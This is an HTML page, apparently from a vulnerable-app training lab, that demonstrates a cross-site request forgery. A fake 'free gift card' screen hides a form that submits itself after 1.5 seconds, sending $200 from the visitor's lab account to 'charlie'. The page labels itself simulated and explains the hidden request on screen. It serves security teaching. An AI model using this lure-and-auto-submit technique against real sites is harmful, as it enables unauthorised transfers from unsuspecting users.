<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>🎉 Congratulations! You Won! (Simulated Malicious Site)</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #1a1a2e;
            color: #eee;
            text-align: center;
            padding-top: 60px;
        }
        .box {
            background: #16213e;
            border: 2px solid #e94560;
            padding: 30px;
            max-width: 500px;
            margin: auto;
            border-radius: 12px;
            box-shadow: 0 0 20px rgba(233, 69, 96, 0.4);
        }
        h1 { color: #e94560; }
        .spinner {
            border: 4px solid rgba(255,255,255,0.1);
            width: 40px;
            height: 40px;
            border-radius: 50%;
            border-left-color: #e94560;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="box">
        <h1>🎁 Claiming Your Free Gift Card...</h1>
        <p>Please wait while we verify your prize ticket...</p>
        <div class="spinner"></div>
        <p style="font-size: 11px; color: #aaa;">(In the background, a hidden CSRF POST request is silently executing to transfer $200 from your VulnLab account to Charlie!)</p>
    </div>

    <!-- Hidden Malicious CSRF Form -->
    <form id="csrf-attack-form" action="/csrf/transfer" method="POST">
        <input type="hidden" name="recipient" value="charlie">
        <input type="hidden" name="amount" value="200.00">
    </form>

    <script>
        // Auto-submit after 1.5 seconds so the user can see what happened
        setTimeout(() => {
            document.getElementById('csrf-attack-form').submit();
        }, 1500);
    </script>
</body>
</html>
